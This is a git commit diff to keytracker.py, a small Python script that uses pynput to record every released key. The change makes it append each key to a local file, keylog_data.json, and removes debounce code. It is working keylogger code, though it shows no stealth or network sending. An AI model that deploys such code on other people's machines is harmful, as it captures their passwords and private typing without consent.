b02f35988d5fd28a8c444fcf3ec0083118cd57de
Thomas Southey <thomassouthey7@gmail.com>
2024-10-10 22:37:03 -0500

    fixed code post revert

--- keytracker.py
+++ keytracker.py
@@ -9,24 +9,18 @@ log_file_path = "keylog_data.json"
 # Initialize the data structure to store keystrokes
 data = {"keystrokes": []}
 
-# Dictionary to store the last time each key was logged
-last_key_time = {}
-debounce_time = 0.5  # Time in seconds before a key can be logged again
-key_pressed = {}  # Dictionary to track the state of each key
-
 def on_release(key):
     try:
         key_str = key.char
     except AttributeError:
         key_str = str(key)
 
-    # Reset the key state when the key is released
-    # key_pressed[key_str] = False
     data["keystrokes"].append(key_str)
 
     # Save the updated data to the JSON file
-    with open(log_file_path, 'w') as f:
-        json.dump(data, f, indent=0)
+    with open(log_file_path, 'a') as f:
+
+        f.write(f"\"{key_str}\"\n")
 
 # Start the keylogger
 with keyboard.Listener(on_release=on_release) as listener:
